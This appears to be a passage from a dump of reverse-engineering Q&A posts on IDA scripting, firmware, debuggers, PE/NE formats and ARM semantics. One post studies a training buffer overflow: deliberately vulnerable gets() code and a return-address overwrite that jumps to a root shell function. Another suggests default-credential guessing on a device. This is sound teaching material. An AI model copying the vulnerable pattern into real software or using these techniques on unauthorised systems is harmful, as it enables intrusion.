<li>of the rest, majority seem to use 8-N-1 with a lower baudrate, such as 38400</li>
<li>in <em>one</em> case, I saw 38400-8-E-1.</li>
</ul>
","296"
"How to get the recovered memory references in IDA-Pro?","1011","","<p>I want to collect all the IDA recovered symbol information in data sections (this information could be <strong>function name</strong>, or it could be <strong>an entry of jump table</strong>, or it could be a <strong>reference to other data sections</strong>).</p>

<p>Here is an example of data sections from a IDA disassembled binary. </p>

<p><img src=""https://i.stack.imgur.com/jKc9B.png"" alt=""enter image description here""></p>

<p>Basically there are three recovered symbols in data section, and I want to collect these information in a format like this:</p>

<pre><code>0x804a018 : sub_804847b
0x804a01dc : _strchr
0x804a020 : sub_80484AE
</code></pre>

<p>I am thinking to traverse all the memory address of a binary's data sections, and check the content of each address, to see whether it is a recovered symbol.  </p>

<p>But basically how to read a suspicious symbol when iterating addresses? I read the <a href=""https://www.hex-rays.com/products/ida/support/idadoc/162.shtml"" rel=""nofollow noreferrer""><code>idc</code></a> interface, but I just cannot find any the correct api to do so. Could anyone help me on this issue? I appreciate that.</p>

<p>------------------------ explain ------------------------</p>

<p>I didn't get an answer in that post, in addition, I think what I explained in that post is somehow misleading.</p>
","<p>As far as I understood your question, you will need the following IDAPython apis:</p>

<ul>
<li>Getting a content from specific memory address : idc.Dword(address) or idc.Qword(address) - you should choose the function according to the pointer size.</li>
<li>Obtaining a name of the address: idc.Name(address)</li>
</ul>

<p>All the mentioned IDAPython apis has the similar things in idc </p>

<p>So, for your specific example you'll get the desired output as follows (IDAPython):</p>

<pre><code>import idc
addresses = [0x804a018, 0x804a01dc ,0x804a020 ]

for a in addresses:
    print hex(a),"" : "", idc.Name(idc.Dword(a))
</code></pre>

<p>Filtering the data in the .data section is completely different story.</p>

<p>For example you can do the following (it is not 100% correct):</p>

<pre><code>import idc

segstart = your_code_segment_start
segend = your_code_segment_end
ptrstep = your_system_pointer_size_in_bytes

for a in range(segstart, segend, ptrstep):
    data = idc.Dword(a) #replace with qword if working with 64 bit)
    if a &lt; segstart or a &gt;= segend:
        continue
    if not idc.Name(data) is None:
        print hex(a), "" --&gt; "", idc.Name(data)
</code></pre>
","8636"
"How to use IDC to clear output window in IDA Pro?","1009","","<p>As a beginner I'm trying to use IDC to clear output window in IDA Pro,but I don't know which function will work.</p>

<p>My IDA Pro version is 6.1.</p>
","<p>I don't think there is one, so I tend to <kbd>Ctrl</kbd>-<kbd>X</kbd> in the console window which is the same as right clicking Clear, before running my IDC scripts.</p>
","4695"
"Firmware extraction problems - binwalk is blank","1007","","<p>I'm trying to extract the firmware from my set-top box (STB) because I realized its port 22 is open and running <a href=""https://wiki.openwrt.org/doc/uci/dropbear"" rel=""nofollow"">dropbear</a>, and I'd like to login to it. Well, because it's there. I've tried <a href=""http://binwalk.org/"" rel=""nofollow"">binwalk</a>, but that's coming up blank:</p>

<pre><code>$ binwalk apollo_fw4_full_p_1.1.32_nand.bin 

DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------

$ 
</code></pre>

<p>Likewise <a href=""https://bitsum.com/firmware_mod_kit.htm"" rel=""nofollow"">Firmware Mod Kit</a> fails:</p>

<pre><code>$ ./extract-firmware.sh ../apollo_fw4_full_p_1.1.32_nand.bin 
Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake

Preparing tools ...
Scanning firmware...

Scan Time:     2016-03-21 15:05:55
Signatures:    193
Target File:   /home/ob1/apollo_fw4_full_p_1.1.32_nand.bin
MD5 Checksum:  b100590cbe030628d97e6d39c6f7fde8

DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------

Extracting 0 bytes of  header image at offset 0
ERROR: No supported file system found! Aborting...
</code></pre>

<p>Does the ""nand"" in the filename mean anything?
Is it encrypted possibly? </p>

<p>Here is a link to the file for those interested: <a href=""https://docs.google.com/uc?id=0B9QI-CmVjKHdekdOOU5EWk9rbTQ&amp;export=download"" rel=""nofollow"">https://docs.google.com/uc?id=0B9QI-CmVjKHdekdOOU5EWk9rbTQ&amp;export=download</a></p>

<p>I've scoured for answers and have found none, so I appreciate your input. </p>
","<p>The firmware image is likely to be encrypted.</p>

<p><img src=""https://i.stack.imgur.com/VjA8q.png"" alt=""Entropy Scan""></p>

<p><a href=""http://binvis.io/"" rel=""nofollow noreferrer"">Entropy scan</a> reveals that it is mostly comprised of random bytes which happens if the firmware is compressed and/or encrypted. Since the binary lacks common compression magic signatures, it is most likely to be encrypted.</p>

<p>To decrypt the firmware you need to obtain more information about the product that uses this firmware. You can refer to <strong><a href=""http://www.devttys0.com/2014/02/reversing-the-wrt120n-firmware-obfuscation/"" rel=""nofollow noreferrer"">this</a></strong> blog post for some ideas.</p>

<p>As you say port 22 is open running a FTP service you can try connecting to it with default user/pass combos. You can try finding other open ports via nmap.</p>
","12269"
"Load IE symbols in Immunity Debugger","1003","","<p>I know Immdbg already recognizes Windows internals function names, like kernel32.dll and user32.dll</p>

<p>What I want is to load Internet Explorer symbols the same way WinDbg does. Does someone knows it is possible, like mshtml.dll?</p>

<p><img src=""https://i.stack.imgur.com/73Ijg.png"" alt=""enter image description here""></p>
","<p>Immunity Debugger 1.60 and above supports loading of PDB Symbol files both locally or from a symbol server. In order to enable it.</p>

<ol>
<li>Go to <em>Debug</em> menu -> <em>Debugging Symbol Options</em>.</li>
</ol>

<p><img src=""https://i.stack.imgur.com/IKvFU.png"" alt=""enter image description here""></p>

<ol start=""2"">
<li>Provide the local path to the symbol files or to a symbol server.</li>
</ol>

<p><img src=""https://i.stack.imgur.com/dW7E9.png"" alt=""enter image description here""></p>

<hr>

<p><strong>UPDATE</strong></p>

<p>If ImmDbg successfully loaded the pdb symbol for the specified file, you would get a message in the logs in the form <code>Debugging Information (DIA Format) available</code> below the dll loading event. See the image below for reference.</p>

<p><img src=""https://i.stack.imgur.com/Pmoo3.png"" alt=""enter image description here""></p>

<p>If even after all this, you cannot load the appropriate symbol for a file, then </p>

<ol>
<li>You may have misconfigured the symbol path.  </li>
<li>In case of local symbol, the PDB file present on the system does not match with the PE.</li>
<li>In case of symbol server, appropriate PDB file could not be found.</li>
</ol>

<p>In such a case you can run the <em>symcheck</em> tool provided with windbg. Example usage</p>

<pre><code>C:\Program Files\Debugging Tools for Windows (x86)&gt;symchk C:\WINDOWS\system32\kernel32.dll /s C:\WINDOWS\Symbols

SYMCHK: FAILED files = 0
SYMCHK: PASSED + IGNORED files = 1

C:\Program Files\Debugging Tools for Windows (x86)&gt;symchk C:\WINDOWS\system32\mshtml.dll /s C:\WINDOWS\Symbols
SYMCHK: mshtml.dll           FAILED  - mshtml.pdb mismatched or not found

SYMCHK: FAILED files = 1
SYMCHK: PASSED + IGNORED files = 0
</code></pre>

<hr>

<p><strong>UPDATE 2</strong></p>

<p>Screenshot of Immunity Debugger with symbols for <em>mshtml.dll</em> loaded. This is taken from Windows XP SP3.</p>

<p><img src=""https://i.stack.imgur.com/cSzrH.png"" alt=""enter image description here""></p>

<p><strong>Other Info</strong>: ImmDbg could not download symbols from the MS Symbol Server, so had to use the symcheck tool to download symbol for <em>mshtml.dll</em> .</p>

<pre><code>symchk /r c:\windows\system32\mshtml.dll /s SRV*c:\symbols\*http://msdl.microsoft.com/download/symbols 
</code></pre>

<p>The symbol directory should look like this.</p>

<pre><code>C:\symbols&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 042A-A7E6

 Directory of C:\symbols

06/05/2015  12:39 PM    &lt;DIR&gt;          .
06/05/2015  12:39 PM    &lt;DIR&gt;          ..
04/15/2008  09:21 AM         7,965,696 mshtml.pdb
06/05/2015  11:17 AM                 0 pingme.txt
</code></pre>

<p>Next, pointed ImmDbg to <code>C:\symbols\</code>. Used <em>loaddll</em> to load <em>mshtml.dll</em> and it automatically picked up the symbol on loading. This can also be seen in the logs.</p>

<p><img src=""https://i.stack.imgur.com/NymMI.png"" alt=""enter image description here""></p>
","9011"
"Reliable algorithm to extract overlay of a PE","1003","","<p>I write a Portable Executable (PE) library that also provides finding the starting offset of the overlay (appended data to the PE that is not mapped into memory).</p>

<p>My algorithm finding the overlay offset looks like this so far:</p>

<pre><code>public long getOverlayOffset() throws IOException {
        if (offset == null) {
            SectionTable table = data.getSectionTable();
            offset = 0L;
            for (SectionTableEntry section : table.getSectionEntries()) {
                long pointerToRaw = section.get(POINTER_TO_RAW_DATA);
                long sizeOfRaw = section.get(SIZE_OF_RAW_DATA);
                long virtSize = section.get(VIRTUAL_SIZE);
                //see https://code.google.com/p/corkami/wiki/PE#section_table: ""if bigger than virtual size, then virtual size is taken. ""
                //and: ""a section can have a null VirtualSize: in this case, only the SizeOfRawData is taken into consideration. ""
                if(virtSize != 0 &amp;&amp; sizeOfRaw &gt; virtSize) { 
                    sizeOfRaw = virtSize;
                }
                long endPoint = pointerToRaw + sizeOfRaw;
                if (offset &lt; endPoint) {
                    offset = endPoint;
                }
            }
        }
        if(offset &gt; file.length()) {
            offset = file.length();
        }
        return offset;
    }
</code></pre>

<p>I used <a href=""https://code.google.com/p/corkami/wiki/PE#section_table"" rel=""noreferrer"">corkami</a> as a source to get to know some of the odds in calculating the overlay offset. I do not only want it to be robust, but also accurate.
Did I miss something? What else do I have to put into consideration?</p>

<p>Note: There was a similar question here: <a href=""https://reverseengineering.stackexchange.com/questions/2014/how-can-one-extract-the-appended-data-of-a-portable-executable"">How can one extract the appended data of a Portable Executable?</a>
But it doesn't cover a reliable algorithm so far. As I understand it, using a tool suffices in that question.</p>
","<p>You appear to be missing the corner cases such as mis-aligned pointers (should round down) and sizes (should round up).</p>

<p>However, even the rounding has corner cases - the physical pointer should be rounded down to a multiple of 512, regardless of the value in the header, but the read size is rounded up by using a combination of the file alignment and 4kb.  The virtual size is always rounded up to a multiple of 4kb, regardless of the value in the header.</p>

<p>Digital signatures must be overlays.  This is a check that is enforced now by Windows, for security reasons.  If not an overlay, the file won't load.</p>

<p>You need something like this (and filealign comes from the PE header):</p>

<pre><code>        long pointerToRaw = section.get(POINTER_TO_RAW_DATA);
        long alignedpointerToRaw = pointerToRaw &amp; ~0x1ff;
        long sizeOfRaw = section.get(SIZE_OF_RAW_DATA);
        long readsize = ((pointerToRaw + sizeOfRaw) + filealign - 1) &amp; ~(filealign - 1)) - alignedpointerToRaw;
        readsize = min(readsize, (sizeOfRaw + 0xfff) &amp; ~0xfff);
        long virtsize = section.get(VIRTUAL_SIZE);

        if (virtsize)
        {
            readsize = min(readsize, (virtsize + 0xfff) &amp; ~0xfff);
        }
</code></pre>

<p>Then you have ""alignedpointerToRaw"" as the starting position, and ""readsize"" as the number of bytes in the section.  Sum these to find the end of the section.  You need to perform this calculation for all sections (because physical data might not be sequential in the file).  The largest sum is the end of the image.  Anything beyond that is overlay.</p>
","4326"
"Semantics of the RRX shift instruction in ARM and Carry flag updates?","999","","<p>Still looking at ARM assembler semantics (and, I try hard to read the specification, I ensure you!!!). I have some doubts about the ARM bit-shift instructions in general and <code>RRX</code> in particular.</p>

<p>Lets start with <code>RRX</code>. </p>

<p>From <a href=""http://www.davespace.co.uk/arm/introduction-to-arm/barrel-shifter.html"" rel=""nofollow noreferrer"">Davespace, Introduction to ARM, section <em>Barrel Shifter</em></a>, we see that <code>RRX</code> correspond to:</p>

<p><img src=""https://i.stack.imgur.com/Fcyhv.png"" alt=""RRX: Barrel RollRotate Right Extended""></p>

<p>I suppose the <code>C</code> to be the carry flag found in the CPSR, is it correct ?</p>

<p>Second question, in the case of the following instruction:</p>

<pre><code>ands   r9, r0, r0, ror #3
</code></pre>

<p>I read that the carry flag (<code>C</code>) is set to the value of the last bit shifted out by the shifter operand (here <code>ROR</code>). </p>

<p>My problem is that the <code>ands</code> is also supposed to update the CPSR because of its flag <code>s</code>. So, who is winning at the end ? And, what is left in the final carry flag ? The value resulting of <code>AND</code> or the value resulting of <code>ROR</code> ?</p>
","<ol>
<li><p>Yes, <code>C</code> is the carry flag.</p></li>
<li><p><code>C</code> is set from the result of the <code>ROR</code> operation. </p></li>
</ol>

<p>Pseudocode of the <code>AND (register)</code> instruction from the <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.ddi0406c/index.html"" rel=""nofollow"">ARM ARM</a>:</p>

<pre><code>if ConditionPassed() then
    EncodingSpecificOperations();
    (shifted, carry) = Shift_C(R[m], shift_t, shift_n, APSR.C);
    result = R[n] AND shifted;
    if d == 15 then // Can only occur for ARM encoding
        ALUWritePC(result); // setflags is always FALSE here
    else
        R[d] = result;
        if setflags then
            APSR.N = result&lt;31&gt;;
            APSR.Z = IsZeroBit(result);
            APSR.C = carry;
            // APSR.V unchanged
</code></pre>

<p>As you can see, <code>APSR.C</code> is set to the result of the shift operation, not the <code>AND</code> operation.</p>

<p>Now, <code>AND</code> is pretty straightforward but in case of e.g. <code>ADD</code> you may have carry affected by both the shift and the add. So what happens? Again, ARM ARM to the rescue:</p>

<pre><code>if ConditionPassed() then
    EncodingSpecificOperations();
    shift_n = UInt(R[s]&lt;7:0&gt;);
    shifted = Shift(R[m], shift_t, shift_n, APSR.C);
    (result, carry, overflow) = AddWithCarry(R[n], shifted, APSR.C);
    R[d] = result;
    if setflags then
        APSR.N = result&lt;31&gt;;
        APSR.Z = IsZeroBit(result);
        APSR.C = carry;
        APSR.V = overflow;
</code></pre>

<p>The answer: the add ""wins"" and the carry of the shift operation is discarded.</p>

<p>BTW, a good page to check what happens for each concrete instruction is <a href=""http://svr-acjf3-armie.cl.cam.ac.uk/main.cgi"" rel=""nofollow"">here</a>. For example:</p>

<pre><code>ands r9, r0, r0, ror #3
machine code: E01091E0
...
cpsr.N  ←   (r0 AND r0 ROR 3)&lt;31&gt;
cpsr.Z  ←   r0 AND r0 ROR 3 = 0
cpsr.C  ←   #CARRY (ROR_C (r0,3))
r9  ←   r0 AND r0 ROR 3
r15 ←   r15 + 4


adds r9, r0, r0, ror #3
machine code: E09091E0
...
cpsr.N  ←   (r0 + r0 ROR 3)&lt;31&gt;
cpsr.Z  ←   r0 + r0 ROR 3 = 0
cpsr.C  ←   #CARRY (AddWithCarry (r0,r0 ROR 3,False))
cpsr.V  ←   #OVERFLOW (AddWithCarry (r0,r0 ROR 3,False))
r9  ←   r0 + r0 ROR 3
r15 ←   r15 + 4
</code></pre>
","6066"
"How can one extract resources from a New Executable?","994","","<p>I'm trying to extract menus and other stuff from a <a href=""https://en.wikipedia.org/wiki/New_Executable"" rel=""nofollow"">New Executable (NE)</a>, i.e. the ones from Windows' 16-bit times. The tools I find (e. g. ResourceTuner) work for <a href=""https://en.wikipedia.org/wiki/Portable_Executable"" rel=""nofollow"">PEs</a> only.</p>

<p>Any idea for tools to facilitate the resource extraction? Could be several steps too, e.g.  one program extracting the raw resources, one displaying them in a proper form.</p>
","<p>You should try <a href=""http://www.openwatcom.org/index.php/Main_Page"">OpenWatcom</a>'s <code>Resource Editor</code>, and also <a href=""http://hiew.ru"">Hiew</a> and <a href=""http://hte.sourceforge.net/"">HT Editor</a> albeit these 2 won't likely display them in proper form, as they are just NE-supporting hex editors.</p>

<p>OpenWatcom includes a full toolchain for Win-16 and dos development.</p>
","2001"
"3D control-flow graphs in IDA","987","","<p>Is there any way to leave 2D flow chart graphs and go to 3D model?
I mean something like that:</p>

<p>Usual 2D graph:
<img src=""https://i.stack.imgur.com/uHTxH.png"" alt=""2D graph""> </p>

<p>3D graph:
<img src=""https://i.stack.imgur.com/qMhs1.png"" alt=""3D graph""></p>

<p>The only one solution I've seen is using UbiGraph + Linux on VM (to use UbiGraph) + some X-server for Win (the process of making all that stuff to work is described at Cr4sh's blog). That's kinda perverted solution, up to me. </p>

<p>Also it would be brilliant if there could be displayed disasm in nodes, like in ordinary 2D IDA graphs.</p>

<p>Perhaps there are some more elegant solutions?</p>
","<p>By default, IDA generates graphs in GDL (WinGraph) format, but you can switch it to DOT which is supported by GraphViz and some other tools. It seems <a href=""http://gephi.org/2010/new-graphviz-dot-csv-and-ucinet-formats/"">Gephi</a> can do 3D.</p>

<p>See <code>GRAPH_FORMAT</code> and <code>GRAPH_VISUALIZER</code> in <code>ida.cfg</code>.</p>
","1472"
"How to prevent use of Resource editors","985","","<p>There are variety of tools that allow editing the resources of Windows executables.
These tools allow a very easy interface for changing the programs look and feel.
Replacing icons, text, menus can be easily done without any knowledge in reversing.</p>

<p>My question is, what option I have to prevent the resources being so easily edited ?</p>
","<p>Resources are just a standard structure with defined constants, but in the end, it's just a recursive structure to a buffer, no matter what it contains (<a href=""http://www.slideshare.net/ange4771/ange-albertini-hashdays2012extended/56"">here is the standard layout</a>).</p>

<p>It can theoretically contain anything - any depth, loops, invalid types, etc... but then standard APIs will not work with them.</p>

<p>So, you need to make sure that, if you encrypt or compress resources, they need to be restored (both the resource directory structure, and their content) before any of these APIs is used, which might not be obvious.</p>

<p>In particular, some resources will be used by the OS even before the file is executed, such as first icons, manifest and version information - so you probably want to keep these intact.</p>

<p>A simple way to prevent trivial resource editing would be to run a stream cipher on selected resources, on the final binary (after the linker put them in place and generated the resource entry in the DataDirectory), and to restore these resources on demand or on program initialization.</p>

<p>If you're looking for a ready-made solution, many good packers such as <a href=""http://bitsum.com/pecompact.php"">PECompact</a> support resource compression, thus preventing external resource editing.</p>
","1400"
"Understanding this Buffer Overflow exploitation","984","","<p>some days ago I took this piece of code from opensecuritytraining.info to test a buffer overflow exploitation:</p>

<pre><code>#include &lt;stdio.h&gt;

char *secret = ""pepito"";

void go_shell(){
    char *shell = ""/bin/sh"";
    char *cmd[] = { ""/bin/sh"", 0 };
    printf(""¿Quieres jugar a un juego?...\n"");
    setreuid(0);
    execve(shell,cmd,0);
}

int authorize(){
    char password[64];
    printf(""Escriba la contraseña: "");
    gets(password);
    if (!strcmp(password,secret))
        return 1;
    else
        return 0;
}

int main(){
    if (authorize()){
        printf(""Acceso permitido\n"");
        go_shell();
    } else{
        printf(""Acceso denegado\n"");
    }
    return 0;
}
</code></pre>

<p>The first test before injecting a shellcode was trying to execute the go_shell function without knowing the password, overflowing the return address of main function and pointing it to the location of go_shell.</p>

<p>As far as I understand the stack is divided as below:</p>

<pre><code>[STACK] {Return_address}{EBP}{password_buffer(64)}...
</code></pre>

<p>So If I store in password_buffer 68 bytes plus the address of go_shell it should overwrite the return address and execute the desired function.</p>

<pre><code>[STACK] {4bytes (Location of go_shell)}{EBP(4 Bytes of junk)}{password_buffer(64)(64 bytes of junk)}...
</code></pre>

<p>The problem here is that I need to fill the buffer with 76 bytes of junk plus 4 bytes of the address to actually override the return address and point %eip to go_shell. What I don't understand is where do those additional 8 bytes come from?</p>

<p>This is the GDB output before injecting 74 A (0x41) + the address in a breakpont at line if (!strcmp(password,secret)):</p>

<pre><code>EBP:
0xbffff4a8: 0x41414141  0x0804851c

AAAA + memory_address
</code></pre>

<p>And continuing to go_shell execution (Breakpoint at void go_shell(){ ):</p>

<p>EIP now points to the last return address overwrited:</p>

<pre><code>(gdb) x/2x $eip
0x804851c &lt;go_shell&gt;:   0x83e58955  0x45c728ec
</code></pre>

<p>Any help understanding this?</p>

<p>Regards.</p>
","<p>If you look at the disassembly of authorize() I'm sure you'll find that the compiler is pushing and restoring more registers than just EBP or aligning the stack. I would recommend that you always look at the disassemly when dealing with overflows of various kinds. The compiler and decompiler, if you use one, hides a lot of details. The disassembly never lies and allows you to make a prediction without resorting to dynamic analysis. I'm a strong proponent of learning with static methods when you're just starting out.</p>

<p>Anyways, whether there's more registers, a stack canary, stack alignment or something else, the disassembly of authorize() will reveal the answer to your question.</p>

<p>For your reference this is the dissembly of the authorize() function using GCC 4.7.3 with -O2.</p>

<pre>
push    ebx
sub     esp, 58h
lea     ebx, [esp+5Ch+password]
mov     [esp+5Ch+arg0], ""Escriba la contrase""
call    _printf
mov     [esp+5Ch+arg0], ebx
call    _gets
mov     eax, secret
mov     [esp+5Ch+arg0], ebx
mov     [esp+5Ch+arg1], eax
call    _strcmp
test    eax, eax
setz    al
add     esp, 58h
movzx   eax, al
pop     ebx
retn
</pre> 

<p>You'll notice that it doesn't use push to move arguments, ebp is unused as a stack frame and the compiler aligns the stack since sum of stack changes is 0x60; return value misaligns by 4, push ebx by 4 more, then sub esp, 0x58 results in 0x60.</p>
","2912"
"Accessing Data Marked as Alignment Bytes in IDA","980","","<p>Some compilers will add useless bytes in functions or in between functions. In the below block of code at 0040117C we can see the ""align"" keyword that was inserted by IDA.   </p>

<pre><code>.text:00401176                 mov     eax, [edx+4]
.text:00401179                 call    eax
.text:0040117B
.text:0040117B locret_40117B:                          ; CODE XREF: sub_401160+Dj
.text:0040117B                 retn
.text:0040117B sub_401160      endp
.text:0040117B
.text:0040117B ; ---------------------------------------------------------------------------
.text:0040117C                 align 10h
.text:00401180
.text:00401180 ; =============== S U B R O U T I N E =======================================
.text:00401180
.text:00401180 ; Attributes: bp-based frame
.text:00401180
.text:00401180 ; int __stdcall sub_401180(void *Src)
</code></pre>

<p>If we were to view this in hex mode in this example we would see ""<code>CC CC ..</code>"". With other compilers we might see ""<code>90 90 ..</code>"". The obvious hint of what this is being used for is the ""align"" keyword. </p>

<p><strong>Question:</strong> how can I tell if a specific byte at an address is marked as <code>align</code> in IDAPython? Example code would be appreciated. </p>

<p>I have found a couple of functions and data types such as <code>FF_ALIGN</code> and <code>idaapi.is_align_insn(ea</code> that looked positive but I have yet to figure out a working example or results that confirm yes or no. I would prefer to rely on IDA types or functions rather than use string parsing for the keyword ""align"". </p>
","<p>Answering my own question so it's not marked as being opened. @DCoder's comment of using <code>isAlign(idaapi.getFlags(ScreenEA()))</code> is correct. </p>

<pre><code>.text:0040117B
.text:0040117B locret_40117B:                          ; CODE XREF: sub_401160+Dj
.text:0040117B                 retn
.text:0040117B sub_401160      endp
.text:0040117B
.text:0040117B ; ---------------------------------------------------------------------------
.text:0040117C                 align 10h
.text:00401180
.text:00401180 ; =============== S U B R O U T I N E =======================================
.text:00401180
.text:00401180 ; Attributes: bp-based frame
.text:00401180
.text:00401180 ; int __stdcall sub_401180(void *Src)
</code></pre>

<p>If we execute the following command. </p>

<pre><code>Python&gt;isAlign(idaapi.getFlags(0x0040117C))
True
</code></pre>

<p>We would get a value of True. Note: This only works for the first byte that is marked as align. All further align bytes will return false. Thanks DCoder for the answer. </p>
","2423"
"C What kind of sorting algorithm is this?","980","","<p>I decompiled a application and found what seems like some kind of sorting algorithm, I was told it's not even a sorting algorithm, but a binary search on stackoverflow</p>

<p>I just don't know which one it is can someone let me know it's actual name?</p>

<p>whatever is passed into the strcmpi wrapper is in some area's divided by 2 who knows some crazy stuff.. I thought it was qsort (quicksort) since it's a standard library for C. But i'm not sure.</p>

<pre><code>int __cdecl SomeKindOfSortAlgorithm(int a1, int a2, int a3, signed int a4, int (__cdecl *a5)(unsigned int, unsigned int), int a6)
{
  int v6; // esi@1
  int result; // eax@1
  int v8; // ebp@2
  int v9; // edi@2

  v6 = 0;
  result = 0;
  *(unsigned int *)a6 = 0;
  if ( !a3 )
    return result;
  v8 = a2;
  v9 = a2 + a4 * (a3 - 1);
  if ( a2 &gt; (unsigned int)v9 )
  {
LABEL_9:
    if ( result &gt; 0 )
      v6 += a4;
    return v6;
  }
  while ( 1 )
  {
    v6 = v8 + a4 * (v9 - v8) / a4 / 2;
    result = a5(a1, v8 + a4 * (v9 - v8) / a4 / 2);
    if ( result &lt; 0 )
    {
      if ( v6 == a2 )
        goto LABEL_9;
      v9 = v6 - a4;
      goto LABEL_8;
    }
    if ( result &lt;= 0 )
      break;
    v8 = v6 + a4;
LABEL_8:
    if ( v8 &gt; (unsigned int)v9 )
      goto LABEL_9;
  }
  *(unsigned int *)a6 = 1;
  if ( v6 == a2 )
  {
LABEL_15:
    result = a2;
  }
  else
  {
    while ( 1 )
    {
      v6 -= a4;
      if ( a5(a1, v6) )
        break;
      if ( v6 == a2 )
        goto LABEL_15;
    }
    result = v6 + a4;
  }
  return result;
}
</code></pre>

<p>Here is the compare function</p>

<pre><code>int __cdecl StrCmpiWrapper(const char *Str1, const char **a2)
{
  return _strcmpi(Str1, *a2);
}
</code></pre>

<p>Here is how you use it.</p>

<pre><code>  int ChatMsgBuffer;
  int v4; // eax@1
  int v5; // eax@5
  int v8; // [sp+10h] [bp-4h]@1

  v4 = SomeKindOfSortAlgorithm(
         ChatMsgBuffer,
         textFile-&gt;Pointer,
         textFile-&gt;TotalElements,
         4,
         (int (__cdecl *)(unsigned int, unsigned int))StrCmpiWrapper,
         (int)&amp;v8);

  if ( !v8 &amp;&amp; v4 )
  {
      //Allocate memory .. copy it and other stuff here.
  }
</code></pre>

<p>Here is how a real qsort looks when decompiled</p>

<pre><code>void __cdecl sub_4015D0(int a1, unsigned int a2, unsigned int a3, unsigned int a4, int (__cdecl *a5)(_DWORD, _DWORD, _DWORD), int a6)
{
  unsigned int v6; // esi@2
  int v7; // edi@9
  unsigned int v8; // esi@32
  int v9; // esi@38
  unsigned int k; // edi@41
  unsigned int v11; // edi@43
  void *v12; // edi@52
  int j; // [sp+Ch] [bp-20h]@52
  unsigned int v14; // [sp+10h] [bp-1Ch]@16
  int v15; // [sp+14h] [bp-18h]@11
  int v16; // [sp+14h] [bp-18h]@16
  unsigned int v17; // [sp+18h] [bp-14h]@9
  int v18; // [sp+1Ch] [bp-10h]@2
  unsigned int v19; // [sp+28h] [bp-4h]@2
  unsigned int i; // [sp+38h] [bp+Ch]@38

  while ( a3 )
  {
    if ( a2 &lt;= 0x20 )
      goto LABEL_37;
    v19 = a1 + a4 * a2;
    v6 = a1 + a4 * (a2 &gt;&gt; 1);
    v18 = a4 + v6;
    sub_401420(a1, a1 + a4 * (a2 &gt;&gt; 1), a1 + a4 * a2 - a4, a4, a5, a6);
    while ( a1 &lt; v6 &amp;&amp; !a5(v6 - a4, v6, a6) )
      v6 -= a4;
    while ( v18 &lt; v19 &amp;&amp; !a5(v18, v6, a6) )
      v18 += a4;
    v7 = v18;
    v17 = v6;
    while ( 1 )
    {
      while ( 1 )
      {
        for ( ; v7 &lt; v19; v7 += a4 )
        {
          v15 = a5(v6, v7, a6);
          if ( v15 &gt;= 0 )
          {
            if ( v15 &gt; 0 )
              break;
            sub_401160(v18, v7, a4);
            v18 += a4;
          }
        }
        if ( a1 &lt; v17 )
        {
          do
          {
            v14 = v17 - a4;
            v16 = a5(v17 - a4, v6, a6);
            if ( v16 &gt;= 0 )
            {
              if ( v16 &gt; 0 )
                break;
              v6 -= a4;
              sub_401160(v6, v14, a4);
            }
            v17 -= a4;
          }
          while ( a1 &lt; v14 );
        }
        if ( v17 == a1 )
          break;
LABEL_27:
        if ( v7 == v19 )
        {
          v17 -= a4;
          v18 -= a4;
          v6 -= a4;
          if ( v17 == v6 )
            sub_401160(v6, v18, a4);
          else
            sub_401220(v17, v18, v6, a4);
        }
        else
        {
          v17 -= a4;
          sub_401160(v7, v17, a4);
          v7 += a4;
        }
      }
      if ( v7 == v19 )
        break;
      if ( v17 != a1 )
        goto LABEL_27;
      if ( v18 == v7 )
        sub_401160(v7, v6, a4);
      else
        sub_401220(v7, v6, v18, a4);
      v7 += a4;
      v6 += a4;
      v18 += a4;
    }
    a3 = (a3 &gt;&gt; 2) + (a3 &gt;&gt; 1);
    v8 = (v6 - a1) / a4;
    a2 = (v19 - v18) / a4;
    if ( v8 &gt; a2 )
    {
      sub_4015D0(v18, a2, a3, a4, a5, a6);
      a2 = v8;
    }
    else
    {
      sub_4015D0(a1, v8, a3, a4, a5, a6);
      a1 = v18;
    }
  }
  if ( a2 &lt;= 0x20 )
  {
LABEL_37:
    if ( a2 &gt; 1 )
    {
      v9 = a1;
      for ( i = a2 - 1; i; --i )
      {
        v9 += a4;
        if ( a5(v9, a1, a6) &gt;= 0 )
        {
          v12 = (void *)v9;
          for ( j = v9; ; v12 = (void *)j )
          {
            j -= a4;
            if ( a5(v9, j, a6) &gt;= 0 )
              break;
          }
          if ( v12 != (void *)v9 )
            sub_401310(v12, v9, a4);
        }
        else
        {
          sub_401310((void *)a1, v9, a4);
        }
      }
    }
    return;
  }
  for ( k = a2 &gt;&gt; 1; k; sub_401500(a1, k, a2, a4, a5, a6) )
    --k;
  v11 = a1 + a4 * a2;
  while ( a2 &gt; 1 )
  {
    v11 -= a4;
    sub_401160(a1, v11, a4);
    --a2;
    sub_401500(a1, 0, a2, a4, a5, a6);
  }
}

int __cdecl sub_401420(int a1, int a2, int a3, unsigned int a4, int a5, int a6)
{
  unsigned int v6; // edi@2
  int result; // eax@2

  if ( 40 * a4 &gt;= a3 - a1 )
  {
    result = sub_4013B0(a1, a2, a3, a4, a5, a6);
  }
  else
  {
    v6 = a4 * (((a3 - a1) / a4 &gt;&gt; 3) + 1);
    sub_4013B0(a1, v6 + a1, a1 + 2 * v6, a4, a5, a6);
    sub_4013B0(a2 - v6, a2, a2 + v6, a4, a5, a6);
    sub_4013B0(a3 - 2 * v6, a3 - v6, a3, a4, a5, a6);
    result = sub_4013B0(a1 + v6, a2, a3 - v6, a4, a5, a6);
  }
  return result;
}

int __cdecl sub_401500(int a1, unsigned int a2, unsigned int a3, int a4, int (__cdecl *a5)(_DWORD, _DWORD, _DWORD), int a6)
{
  int v6; // ebx@1
  int v7; // esi@1
  int i; // edi@1
  int result; // eax@6
  unsigned int v10; // ebx@7
  unsigned int v11; // edi@7
  int v12; // [sp+Ch] [bp-4h]@1

  v12 = a2;
  v6 = 2 * a2 + 2;
  v7 = a1 + a4 * a2;
  for ( i = a1 + a4 * (2 * a2 + 2); v6 &lt;= a3; i = a1 + a4 * v6 )
  {
    if ( v6 == a3 || a5(i, i - a4, a6) &lt; 0 )
    {
      --v6;
      i -= a4;
    }
    sub_401160(v7, i, a4);
    a2 = v6;
    v7 = i;
    v6 = 2 * v6 + 2;
  }
  result = v12;
  if ( v12 &lt; a2 )
  {
    do
    {
